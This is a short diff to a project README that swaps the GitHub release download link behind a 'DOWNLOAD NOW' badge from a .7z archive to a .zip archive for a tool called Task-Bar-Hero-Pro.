@@ -61,7 +61,7 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/FractionTurtle51/Task-Bar-Hero-Pro/releases/download/4/TBH-Pro.7z">
+  <a href="https://github.com/FractionTurtle51/Task-Bar-Hero-Pro/releases/download/4/tbhpro.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
